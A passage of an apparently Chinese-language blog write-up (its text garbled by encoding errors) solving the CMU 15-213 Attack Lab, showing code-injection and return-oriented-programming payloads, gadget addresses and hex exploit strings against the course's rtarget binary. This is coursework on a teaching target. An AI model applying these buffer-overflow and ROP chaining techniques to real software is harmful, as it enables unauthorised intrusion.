0x61663739      0x00400000      0x00000000<br>0x5561dcb8:     0x00000000      0x00000000      0xf4f4f4f4      0xf4f4f4f4<br></code></pre></td></tr></table></figure><p>è¿æ°”æ¯”è¾ƒå¥½ï¼Œå¹¶æ²¡æœ‰è¢«è¦†ç›–ã€‚äº‹å®ä¸Šï¼Œæˆ‘ä»¬è§‚å¯Ÿå¯ä»¥å‘ç°ï¼Œåœ¨ç¬¬ä¸‰è¡Œ<code>0x55586000</code>åçš„åœ°å€å‡ä¸ä¼šè¢«è¦†ç›–ï¼ˆå®é™…ä¸Šè¿™é‡Œå°±æ˜¯<code>ret</code>å‰<code>%rsp</code>æŒ‡å‘çš„åœ°å€ï¼‰ã€‚å¦‚æœç¡¬ç¼–ç åœ°å€çš„è¯ï¼Œæˆ‘ä»¬é€‰æ‹©<code>0x5561dca8</code>å³å¯ï¼Œå†æ§åˆ¶bufä½¿å…¶æº¢å‡ºåˆ°æ­¤ä½ç½®å³å¯ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">pushq$0x4018fa<br>movq$0x5561dca8,%rdi<br>retq<br></code></pre></td></tr></table></figure><p>æœ€ç»ˆç­”æ¡ˆï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">68</span> fa <span class="hljs-number">18</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">48</span> c7 c7 a8 dc <span class="hljs-number">61</span> <span class="hljs-number">55</span> <br><span class="hljs-attribute">c3</span> <br><span class="hljs-attribute">ff</span> ff ff ff ff ff ff<br><span class="hljs-attribute">ff</span> ff ff ff ff ff ff ff ff ff <br><span class="hljs-attribute">ff</span> ff ff ff ff ff ff ff ff ff <br><span class="hljs-attribute">78</span> dc <span class="hljs-number">61</span> <span class="hljs-number">55</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">35</span> <span class="hljs-number">39</span> <span class="hljs-number">62</span> <span class="hljs-number">39</span> <span class="hljs-number">39</span> <span class="hljs-number">37</span> <span class="hljs-number">66</span> <span class="hljs-number">61</span> <span class="hljs-number">00</span><br></code></pre></td></tr></table></figure><p>ç»æ£€éªŒæ­£ç¡®æ— è¯¯ã€‚</p><h2 id="Part-II-Return-Oriented-Programming"><a href="#Part-II-Return-Oriented-Programming" class="headerlink" title="Part II: Return-Oriented Programming"></a>Part II: Return-Oriented Programming</h2><p>åœ¨ç¬¬äºŒé˜¶æ®µï¼Œæˆ‘ä»¬å°†ä½¿ç”¨ROPçš„æ¨¡å¼æ¥æ”»å‡»<code>rtarget</code>æ–‡ä»¶ã€‚ç›¸æ¯”äº<code>ctarget</code>ï¼Œè¯¥æ–‡ä»¶é‡‡å–äº†ä¸€äº›ä¿æŠ¤æªæ–½ï¼Œä¾‹å¦‚æ ˆåœ°å€éšæœºåŒ–å’Œéƒ¨åˆ†æ ˆå†…å®¹æ˜¯åªè¯»çš„ï¼Œæ¥é˜²æ­¢ä»£ç æ³¨å…¥æ”»å‡»ã€‚å› æ­¤æˆ‘ä»¬é‡‡å–<em>Return-Oriented Programming</em>çš„æ”»å‡»æ–¹æ³•ã€‚</p><p>è¯¥æ–¹æ³•çš„åŸç†æ˜¯ç¨‹åºçš„æ±‡ç¼–è¯­è¨€ä»£ç ä¸­ï¼Œä¼šå‡ºç°æˆ‘ä»¬éœ€è¦çš„ä»£ç ç‰‡æ®µï¼Œåªè¦æˆ‘ä»¬è¿›è¡Œé€‚å½“çš„æˆªå–æ‹¼æ¥ï¼Œä¾¿èƒ½â€œå‡‘â€å‡ºæˆ‘ä»¬çš„æ”»å‡»ä»£ç ï¼Œä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">setval_210</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> *p)</span><br>&#123;<br>    *p = <span class="hljs-number">3347663060U</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸Šè¿°è¿™æ®µä»£ç å°†ä¸€ä¸ªunsignedæŒ‡é’ˆçš„å€¼æ”¹å˜æˆä¸€ä¸ªå¾ˆå¥‡æ€ªçš„æ•°å­—ï¼Œæˆ‘ä»¬è§‚å¯Ÿå®ƒçš„æ±‡ç¼–ä»£ç ä»¥åŠå¯¹åº”çš„å­—èŠ‚ç :</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0000000000400f15 &lt;setval_210&gt;:<br>  400f15:       c7 07 d4 48 89 c7       movl   $0xc78948d4,(%rdi)<br>  400f1b:       c3                      retq<br></code></pre></td></tr></table></figure><p>ä»åœ°å€<code>0x400f18</code>åˆ°<code>0x400f1b</code>çš„å››ä¸ªå­—èŠ‚å†…å®¹ä¸º<code>48 89 c7 c3</code>ï¼Œç¿»è¯‘ä¸ºæ±‡ç¼–è¯­è¨€å³ä¸ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">movq%rax,%rdi ;48 89 c7<br>ret;c3<br></code></pre></td></tr></table></figure><p>è¿™æ ·çš„ç‰‡æ®µæˆ‘ä»¬ç§°ä¹‹ä¸º<strong>gadget</strong>ï¼Œè‹¥æˆ‘ä»¬åœ¨æ ˆä¸Šæ”¾ç½®ä¸€äº›ç²¾å¿ƒè®¾è®¡çš„gadgetåœ°å€ï¼Œåˆ©ç”¨retå®ç°ä»£ç ä¹‹é—´çš„è·³è½¬ï¼š</p><p><img src="/Pictures/CMU15-213/rop.jpg" alt="stack"></p><p>å°±å¯ä»¥è®©ç¨‹åºè¿è¡Œä¸€äº›æˆ‘ä»¬æ‰€æœŸæœ›å®ƒè¿è¡Œçš„ä»£ç ç‰‡æ®µï¼Œä»è€Œå¯ä»¥ç»•è¿‡éšæœºåŒ–æ ˆåœ°å€å’Œåªè¯»æ ˆåœ°å€è¿™ç§ä¿æŠ¤ç­–ç•¥ã€‚</p><p>æœ¬é¢˜ä¸­æœ‰ä¸€ä¸ªè¿™æ ·çš„ä»£ç ä»“åº“ï¼Œå«åšfarmï¼Œé¢˜ç›®è¦æ±‚æˆ‘ä»¬åˆ©ç”¨farmé‡Œçš„gadgeté‡æ–°å®Œæˆä¸€élevel2å’Œlevel3çš„æ”»å‡»ï¼Œä¹Ÿå°±æ˜¯level4å’Œlevel5ã€‚</p><p>ä¸‹é¢æ˜¯å¯èƒ½ç”¨åˆ°çš„ä»£ç å¯¹åº”çš„å­—èŠ‚ç ï¼š</p><p><img src="/Pictures/CMU15-213/ByteEncoding.png" alt="ByteEncoding"></p><h3 id="Level-4"><a href="#Level-4" class="headerlink" title="Level 4"></a>Level 4</h3><p>æˆ‘ä»¬æ‰¾å›Level 2çš„æ±‡ç¼–ä»£ç ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">movq$0x59b997fa,%rdi<br>pushq$0x4017ec<br>retq<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬è¦åšçš„ä¾¿æ˜¯å°†ç«‹å³æ•°cookieç§»åˆ°<code>%rdi</code>ä¸­ã€‚ä½†æ˜¯å­˜åœ¨çš„é—®é¢˜æ˜¯æˆ‘ä»¬æ— æ³•åˆ©ç”¨gadgetç›´æ¥æ„é€ cookieï¼Œè¿™å°±è¯´æ˜æˆ‘ä»¬åªèƒ½æ‰‹åŠ¨ä¼ å…¥cookieå¹¶å‚¨å­˜åœ¨æ ˆä¸­ï¼Œåˆ©ç”¨å…¶å®ƒæŒ‡ä»¤å†è¿›è¡Œè°ƒç”¨ã€‚</p><p>åœ¨å’Œæ ˆè¿›è¡Œæ•°æ®äº¤äº’çš„æŒ‡ä»¤ä¸­ï¼Œæˆ‘ä»¬è€ƒè™‘<code>pushq</code>å’Œ<code>popq</code>æŒ‡ä»¤ã€‚å›å¿†ä¸€ä¸‹è¿™ä¸¤ä¸ªæŒ‡ä»¤çš„åŠŸèƒ½ï¼š</p><table><thead><tr><th>æŒ‡ä»¤</th><th>æ•ˆæœ</th><th>æè¿°</th></tr></thead><tbody><tr><td>pushq S</td><td>R[%rsp]-8 â†’ R[%rsp];S â†’ M[R[%rsp]]</td><td>å°†å››å­—å‹å…¥æ ˆ</td></tr><tr><td>popq D</td><td>M[R[%rsp]] â†’ D;R[%rsp]+8 â†’ R[%rsp]</td><td>å°†å››å­—å¼¹å‡ºæ ˆ</td></tr></tbody></table><p>æˆ‘ä»¬å‘ç°<code>popq</code>æŒ‡ä»¤å¯ä»¥å®ç°å°†æ ˆé¡¶çš„å››å­—å‚¨å­˜åˆ°ç›®æ ‡å¯„å­˜å™¨ä¸­ï¼Œè¿™å°±è¯´æ˜æˆ‘ä»¬å¯ä»¥å…ˆå°†cookieä¼ å…¥æ ˆé¡¶ï¼Œåœ¨åˆ©ç”¨è¯¥æŒ‡ä»¤å°†å…¶ç›´æ¥æˆ–é—´æ¥ä¼ é€’åˆ°å¯„å­˜å™¨ä¸­ï¼Œå®ç°æˆ‘ä»¬æ‰€éœ€è¦çš„æ“ä½œã€‚</p><p>æˆ‘ä»¬å°†farmè½¬æ¢ä¸ºå¯¹åº”çš„å­—èŠ‚ç ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc -c farm.c<br>objdump -d farm.o &gt; farm.s<br></code></pre></td></tr></table></figure><p>å¾—åˆ°farmä¸­æ¯ä¸ªå‡½æ•°å¯¹åº”çš„å­—èŠ‚ç ï¼Œæ–¹ä¾¿æˆ‘ä»¬æ„é€ gadgetã€‚</p><p>ä½†æ˜¯äº‹å®ä¸Šå½“æˆ‘å¾—åˆ°è½¬æ¢ä¹‹åçš„å­—èŠ‚ç æ—¶ï¼Œæˆ‘å‘ç°åœ°å€æ˜¯ä»0x0000å¤„å¼€å§‹çš„ï¼Œè¿™è¯´æ˜ç›´æ¥è½¬æ¢farm.cæ–‡ä»¶ä¸èƒ½å¾—å‡ºè¿è¡Œæ—¶å¯¹åº”gadgetçš„åœ°å€ğŸ˜¥</p><p>æ‰€ä»¥æˆ‘ä»¬è¿˜æ˜¯å›åˆ°<code>rtarget</code>ä¸­ï¼Œç›´æ¥æ‰¾åˆ°å¯¹åº”çš„åœ°å€ï¼š<code>objdump -d rtarget &gt; rtarget.s</code></p><p>å®šä½å¦‚ä¸‹ç‰‡æ®µï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">4019a7: 8d 87 51 73 58 90     lea -0x6fa78caf(%rdi), %eax<br>4019ad: c3                    retq<br></code></pre></td></tr></table></figure><p>ä»<code>0x4019ab</code>åˆ°<code>0x4019ad</code>ä¸º<code>58 90 c3</code>ï¼Œå¯¹åº”ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">popq%rax<br>nop<br>ret<br></code></pre></td></tr></table></figure><p>åŒæ ·ï¼Œå®šä½å¦‚ä¸‹ç‰‡æ®µï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">4019a0: 8d 87 48 89 c7 c3     lea -0x3c3876b8(%rdi), %eax<br>4019a6: c3                    retq<br></code></pre></td></tr></table></figure><p>ä»<code>0x4019a2</code>åˆ°<code>0x4019a5</code>ä¸º<code>48 89 c7 c3</code>ï¼Œå¯¹åº”ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">movq%rax,%rdi<br></code></pre></td></tr></table></figure><p>å› æ­¤æˆ‘ä»¬è¿›è¡Œç»„è£…ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">ab</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">fa</span> <span class="hljs-number">97</span> b9 <span class="hljs-number">59</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">a2</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">ec</span> <span class="hljs-number">17</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br></code></pre></td></tr></table></figure><h3 id="Level-5"><a href="#Level-5" class="headerlink" title="Level 5"></a>Level 5</h3><p>åŒæ ·çš„ï¼Œæˆ‘ä»¬ä¾ç„¶æ˜¯å…ˆæ‰¾å‡ºæ‰€éœ€è¦è¿›è¡Œçš„æ“ä½œï¼Œå†è¿›è¡Œæ‹¼å‡‘ã€‚</p><p>è¦å¤ç°Level 3 çš„æ“ä½œï¼Œé‡ç‚¹æ˜¯å®šä½å­—ç¬¦ä¸²å­˜å‚¨çš„ä½ç½®ã€‚ç”±äºå­—ç¬¦ä¸²çš„å­˜æ”¾ä½ç½®å–å†³äºæˆ‘ä»¬å‰é¢çš„æ“ä½œçš„æ•°é‡ï¼Œåœ¨è¿™é‡Œç”¨ç¡¬ç¼–ç å¹¶ä¸æ˜¯ä¸€ä¸ªå¥½çš„é€‰æ‹©ï¼Œæˆ‘ä»¬å¯ä»¥è½¬æ¢ä¸€ä¸‹æ€è·¯ï¼Œåˆ©ç”¨<code>lea</code>æŒ‡ä»¤ï¼Œä½¿ç”¨å¯„å­˜å™¨å’Œåç§»é‡æ¥è¿›è¡Œå®šä½ã€‚</p><p>ç»“åˆfarmçš„ç°æœ‰æŒ‡ä»¤ï¼Œæˆ‘ä»¬åˆæ­¥çš„è®¾æƒ³æ˜¯ï¼š</p><ol><li><p>å…ˆå°†<code>%rsp</code>åœ°å€å­˜å…¥<code>%rdi</code>ï¼Œåç§»é‡å­˜å…¥<code>%rsi</code>ï¼Œå…ˆå°†è®¡ç®—åçš„åœ°å€ä¿å­˜åœ¨<code>%rax</code>ä¸­ï¼Œå†å°†<code>%rax</code>è½¬ç§»åˆ°<code>%rdi</code>ä¸­ã€‚è¿™æ˜¯æºäºfarmä¸­çš„ä»£ç ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">00000000004019d6 &lt;add_xy&gt;:<br>  4019d6:48 8d 04 37          lea    (%rdi,%rsi,1),%rax<br>  4019da:c3                   retq  <br></code></pre></td></tr></table></figure></li><li><p>è®¡ç®—åç§»é‡ï¼Œå­˜å…¥å­—ç¬¦</p></li><li><p>è°ƒç”¨touch3</p></li></ol><p>ç¬¬ä¸€æ­¥æ— ç–‘æ˜¯æœ€ä¸ºç¹ççš„ï¼š</p><ul><li><p><code>%rsp</code> &#x3D;&gt; <code>%rax</code> &#x3D;&gt; <code>%rdi</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0000000000401a03 &lt;addval_190&gt;:<br>  401a03:8d 87 41 48 89 e0    lea    -0x1f76b7bf(%rdi),%eax<br>  401a09:c3                   retq <br><br>00000000004019c3 &lt;setval_426&gt;:<br>  4019c3:c7 07 48 89 c7 90    movl   $0x90c78948,(%rdi)<br>  4019c9:c3 <br></code></pre></td></tr></table></figure><p>å¯æˆªå–å‡º<code>48 89 e0</code>å’Œ<code>48 89 c7</code>ï¼Œå¯¹åº”åœ°å€ä¸º<code>401a06</code>å’Œ<code>4019c5</code></p></li><li><p>åç§»é‡ï¼ˆæš‚å®šä¸ºxï¼‰ &#x3D;&gt; <code>%rax</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">00000000004019a7 &lt;addval_219&gt;:<br>  4019a7:8d 87 51 73 58 90    lea    -0x6fa78caf(%rdi),%eax<br>  4019ad:c3  <br></code></pre></td></tr></table></figure><p>æˆªå–<code>58 90 c3</code>ä¸º<code>popq %rax,ret</code>ï¼Œåœ°å€ä¸º<code>4019ab</code></p><p>æ¥ä¸‹æ¥çš„8å­—èŠ‚å­˜æ”¾æˆ‘ä»¬çš„åç§»é‡ï¼Œè¢«popè¿›å…¥<code>%rax</code></p></li><li><p><code>%eax</code> &#x3D;&gt; <code>%edx</code> &#x3D;&gt; <code>%ecx</code> &#x3D;&gt; <code>%esi</code></p><p><del>ä¸ºä»€ä¹ˆè¦è¿™ä¹ˆå¤æ‚ï¼Œå› ä¸ºgadgetå¾ˆéš¾æˆªå–å•Šqwq</del></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0000000000401a40 &lt;addval_487&gt;:<br>  401a40:8d 87 89 c2 84 c0    lea    -0x3f7b3d77(%rdi),%eax<br>  401a46:c3<br>  <br>0000000000401a33 &lt;getval_159&gt;:<br>  401a33:b8 89 d1 38 c9       mov    $0xc938d189,%eax<br>  401a38:c3 <br><br>0000000000401a25 &lt;addval_187&gt;:<br>  401a25:8d 87 89 ce 38 c0    lea    -0x3fc73177(%rdi),%eax<br>  401a2b:c3  <br></code></pre></td></tr></table></figure><p>è¿™ä¸‰æ®µåˆ†åˆ«å¯¹åº”ä¸‰æ­¥ï¼Œ<code>89 c2</code>ï¼Œ<code>401a42</code>ï¼›<code>89 d1</code>ï¼Œ<code>401a34</code>ï¼›<code>89 ce</code>ï¼Œ<code>401a27</code></p></li><li><p>æ‰§è¡Œ<code>lea</code>æŒ‡ä»¤å¾—å‡ºåœ°å€ï¼Œåœ°å€ä¸º<code>4019d6</code></p></li><li><p>å°†åœ°å€ä»<code>%rax</code>è½¬å…¥<code>%rdi</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">00000000004019c3 &lt;setval_426&gt;:<br>  4019c3:c7 07 48 89 c7 90    movl   $0x90c78948,(%rdi)<br>  4019c9:c3 <br></code></pre></td></tr></table></figure><p><code>48 89 c7</code>å¯¹åº”åœ°å€<code>4019c5</code></p></li><li><p>è°ƒç”¨<code>touch3</code>ï¼Œåœ°å€ä¸º<code>4018fa</code></p></li><li><p>è®¡ç®—åç§»é‡ï¼Œå‰é¢å…±æœ‰9æ¡åœ°å€åŠ ä¸€ä¸ªåç§»é‡ï¼Œç›¸å¯¹äºbufæ•°ç»„å¤šå 80å­—èŠ‚ã€‚ç”±äº<code>%rsp</code>æŒ‡å‘bufå¤§8å­—èŠ‚çš„ä½ç½®ï¼ˆä¹‹å‰å‚¨å­˜è¿”å›testå‡½æ•°çš„åœ°å€çš„8å­—èŠ‚ï¼‰ï¼Œæ‰€ä»¥åç§»é‡ä¸º72&#x3D;0x48ï¼Œåœ¨è¿™é‡Œåé¢çš„8å­—èŠ‚å­˜æ”¾cookieã€‚</p></li></ul><p>ç»„è£…èµ·æ¥ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">06</span> <span class="hljs-number">1</span>a <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  &lt;-- movq %rsp, %rax<br><span class="hljs-attribute">c5</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  &lt;-- movq %rax, %rdi<br><span class="hljs-attribute">ab</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  &lt;-- popq %rax<br><span class="hljs-attribute">48</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  &lt;-- åç§»é‡<br><span class="hljs-attribute">42</span> <span class="hljs-number">1</span>a <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  &lt;-- movl %eax, %edx<br><span class="hljs-attribute">34</span> <span class="hljs-number">1</span>a <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  &lt;-- movl %edx, %ecx<br><span class="hljs-attribute">27</span> <span class="hljs-number">1</span>a <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  &lt;-- movl %ecx, %esi<br><span class="hljs-attribute">d6</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  &lt;-- lea  (%rdi,%rsi,<span class="hljs-number">1</span>),%rax<br><span class="hljs-attribute">c5</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  &lt;-- movq %rax, %rdi<br><span class="hljs-attribute">fa</span> <span class="hljs-number">18</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  &lt;-- touch3<br><span class="hljs-attribute">35</span> <span class="hljs-number">39</span> <span class="hljs-number">62</span> <span class="hljs-number">39</span> <span class="hljs-number">39</span> <span class="hljs-number">37</span> <span class="hljs-number">66</span> <span class="hljs-number">61</span>  &lt;-- cookie å€¼<br></code></pre></td></tr></table></figure><p>ç»“æœï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">Cookie: 0x59b997fa<br>Touch3!: You called touch3(<span class="hljs-string">&quot;59b997fa&quot;</span>)<br>Valid solution <span class="hljs-keyword">for</span> level 3 with target rtarget<br>PASS: Would have posted the following:<br>        user <span class="hljs-built_in">id</span> bovik<br>        course  15213-f15<br>        lab     attacklab<br>        result  1:PASS:0xffffffff:rtarget:3:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 06 1A 40 00 00 00 00 00 C5 19 40 00 00 00 00 00 AB 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 42 1A 40 00 00 00 00 00 34 1A 40 00 00 00 00 00 27 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 C5 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CMU15-213</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>BombLab</title>
    <link href="/2024/07/07/BombLab/"/>
    <url>/2024/07/07/BombLab/</url>
    
